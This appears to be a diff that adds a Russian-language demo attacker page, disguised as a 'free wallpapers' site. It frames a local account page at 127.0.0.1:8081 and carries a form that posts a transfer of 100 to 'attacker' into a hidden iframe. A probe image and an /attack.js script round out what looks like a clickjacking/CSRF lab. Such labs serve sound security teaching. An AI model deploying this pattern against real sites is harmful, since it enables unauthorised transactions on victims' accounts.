@@ -1,0 +1,15 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Бесплатные обои</title>
+<h1>Бесплатные обои</h1>
+<p>Страница с чужого origin. Ниже встроен кабинет.</p>
+<iframe id="victim" title="кабинет" src="http://127.0.0.1:8081/"
+        width="420" height="200"></iframe>
+<form id="write" method="post" target="sink"
+      action="http://127.0.0.1:8081/transfer">
+  <input name="to" value="attacker">
+  <input name="amount" value="100">
+</form>
+<iframe name="sink" title="ответ на отправку формы" hidden></iframe>
+<img id="probe" alt="" src="http://127.0.0.1:8081/logo.png">
+<script src="/attack.js"></script>
